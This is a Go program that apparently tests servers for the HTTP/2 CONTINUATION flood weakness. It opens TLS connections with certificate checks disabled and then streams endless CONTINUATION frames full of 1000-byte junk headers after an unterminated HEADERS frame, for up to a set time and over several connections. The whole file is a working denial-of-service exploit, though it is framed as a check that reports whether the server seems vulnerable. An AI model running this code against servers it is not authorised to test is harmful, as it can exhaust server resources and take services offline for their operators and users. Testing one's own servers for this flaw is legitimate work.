package main

import (
	"bytes"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const (
	ClientPreface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
)

var (
	numConns                                  int
	urlStr                                    string
	streamCounter                             uint32
	waitTime                                  int
	delayTime                                 int
	sentHeaders, sentContinuation, recvFrames int32
	timeLimit                                 int
	verbose                                   bool
)

type http2Client struct {
	cc                  net.Conn
	fr                  *http2.Framer
	headerBuf           *bytes.Buffer
	mu                  *sync.Mutex
	headerEncoder       *hpack.Encoder
	continuationBuf     *bytes.Buffer
	continuationEncoder *hpack.Encoder
	url                 *url.URL
	path                string
}

func (hc *http2Client) writeInitialSettings() error {
	hc.mu.Lock()
	defer hc.mu.Unlock()

	if err := hc.fr.WriteSettings(); err != nil {
		return err
	}
	return nil
}

func (hc *http2Client) writePreface() error {
	n, err := hc.cc.Write([]byte(ClientPreface))
	if err != nil {
		return err
	}
	if n != len(ClientPreface) {
		return fmt.Errorf("writing client preface, wrote %d bytes; want %d", n, len(ClientPreface))
	}
	return nil
}

func (hc *http2Client) writeSettingsAck() error {
	if err := hc.fr.WriteSettingsAck(); err != nil {
		return fmt.Errorf("error writing ACK of server's SETTINGS: %v", err)
	}
	return nil
}

func (hc *http2Client) sendHeader() uint32 {
	hc.headerEncoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	hc.headerEncoder.WriteField(hpack.HeaderField{Name: ":path", Value: hc.path})
	hc.headerEncoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	hc.headerEncoder.WriteField(hpack.HeaderField{Name: ":authority", Value: hc.url.Host})

	sizeCtr := hc.headerBuf.Len()
	fmt.Println("Header size: ", sizeCtr)

	streamID := atomic.AddUint32(&streamCounter, 2) // Increment streamCounter and allocate stream ID in units of two to ensure stream IDs are odd numbered per RFC 9113
	if err := hc.fr.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      streamID,
		BlockFragment: hc.headerBuf.Bytes(),
		EndStream:     false,
		EndHeaders:    false,
	}); err != nil {
		fmt.Printf("[%d] Failed to send HEADERS: %s", streamID, err)
	} else {
		atomic.AddInt32(&sentHeaders, 1)
		fmt.Printf("[%d] Sent HEADERS on stream %d, total size = %d\n", streamID, streamID, sizeCtr)
	}

	return streamID
}

func (hc *http2Client) sendContinuationFrames(streamID uint32, contCount int, endHeader bool) error {
	var headerBlock bytes.Buffer

	// Encode continuation header
	encoder := hpack.NewEncoder(&headerBlock)
	encoder.WriteField(hpack.HeaderField{Name: fmt.Sprintf(":cont-header-#%v", contCount), Value: getLongString()})

	if err := hc.fr.WriteContinuation(streamID, endHeader, headerBlock.Bytes()); err != nil {
		if verbose {
			fmt.Printf("[%d] Failed to send CONTINUATION: %s\n", streamID, err)
		}
		return err
	} else {
		atomic.AddInt32(&sentContinuation, 1)
		if verbose {
			fmt.Printf("[%d] Sent CONTINUATION on stream %d\n", streamID, streamID)
		}
	}
	return nil
}

// HPACK headers, write HEADERS to server, followed by CONTINUATION frames
func (hc *http2Client) sendRequests(delay int, doneChan chan<- struct{}) {
	defer func() {
		doneChan <- struct{}{}
	}()

	streamID := hc.sendHeader()

	continuationCount := 0
	timer := time.NewTimer(time.Duration(timeLimit) * time.Second)
	for {
		select {
		case <-timer.C:
			hc.sendContinuationFrames(streamID, continuationCount, true)
			return
		default:
			err := hc.sendContinuationFrames(streamID, continuationCount, false)
			if errors.Is(err, syscall.EPIPE) {
				fmt.Println("connection closed by the server when sending CONTINUATION frame. Server is not likely vulnerable")
				return
			}
			continuationCount++
		}
	}
}

func (hc *http2Client) wantSettings() (*http2.SettingsFrame, error) {
	f, err := hc.fr.ReadFrame()
	if err != nil {
		return nil, fmt.Errorf("error while expecting a SETTINGS frame: %v", err)
	}

	sf, ok := f.(*http2.SettingsFrame)
	if !ok {
		return nil, fmt.Errorf("got a %T; want *SettingsFrame", f)
	}
	return sf, nil
}

func init() {
	flag.IntVar(&timeLimit, "time limit", 120, "Number of seconds to limit continuation frame requests")
	flag.StringVar(&urlStr, "url", "https://localhost:8443", "Server URL")
	flag.IntVar(&waitTime, "wait", 0, "Wait time in milliseconds between starting workers")
	flag.IntVar(&numConns, "connections", 1, "Number of concurrent connections")
	flag.BoolVar(&verbose, "verbose", false, "Verbose output")
	flag.Parse()
}

func getLongString() string {
	return strings.Repeat("A", 1000)
}

func NewHttp2Client(urlStr string) http2Client {
	serverURL, err := url.Parse(urlStr)
	if err != nil {
		log.Fatalf("Failed to parse URL: %v", err)
	}

	path := serverURL.Path
	if path == "" {
		path = "/"
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
	}

	conn, err := tls.Dial("tcp", serverURL.Host, tlsConfig)
	if err != nil {
		log.Fatalf("Failed to dial: %s", err)
	}

	var headerBuf bytes.Buffer
	var continuationBuf bytes.Buffer
	var mu sync.Mutex
	return http2Client{
		cc:                  conn,
		fr:                  http2.NewFramer(conn, conn),
		headerEncoder:       hpack.NewEncoder(&headerBuf),
		headerBuf:           &headerBuf,
		continuationEncoder: hpack.NewEncoder(&continuationBuf),
		continuationBuf:     &continuationBuf,
		url:                 serverURL,
		path:                path,
		mu:                  &mu,
	}
}

func testContinuationFlood(doneChan chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()
	streamCounter = 1

	hc := NewHttp2Client(urlStr)

	if err := hc.writePreface(); err != nil {
		log.Fatalf("Failed to send client preface: %s", err)
	}

	if err := hc.writeInitialSettings(); err != nil {
		log.Fatalf("Failed to write settings: %s", err)
	}

	_, err := hc.wantSettings()
	if err != nil {
		log.Fatal(err)
	}

	err = hc.writeSettingsAck()
	if err != nil {
		log.Fatal(err)
	}

	go func() {
		for {
			frame, err := hc.fr.ReadFrame()
			if err != nil {
				if err == io.EOF {
					return
				}
				fmt.Printf("Failed to read frame: %s", err)
			} else {
				atomic.AddInt32(&recvFrames, 1)
				switch frame.(type) {
				case *http2.HeadersFrame:
					fmt.Printf("received HEADERS frame: %v\n", frame)
				case *http2.GoAwayFrame:
					fmt.Printf("received GOAWAY frame: %v\n", frame)
				default:
					fmt.Printf("received frame: %v\n", frame)
				}
			}
		}
	}()

	hc.sendRequests(delayTime, doneChan)
}

func printSummary() {
	fmt.Printf("\n--- Summary ---\n")
	fmt.Printf("Frames sent: HEADERS = %d, CONTINUATION = %d\n", sentHeaders, sentContinuation)
	fmt.Printf("Frames received: %d\n", recvFrames)
}

func main() {
	var wg sync.WaitGroup
	wg.Add(numConns)

	doneChan := make(chan struct{}, numConns)

	for i := 0; i < numConns; i++ {
		go testContinuationFlood(doneChan, &wg)
		time.Sleep(time.Millisecond * time.Duration(waitTime))
	}

	wg.Wait()
	close(doneChan)

	// Wait for all workers to finish
	for i := 0; i < numConns; i++ {
		<-doneChan
	}

	printSummary()
}
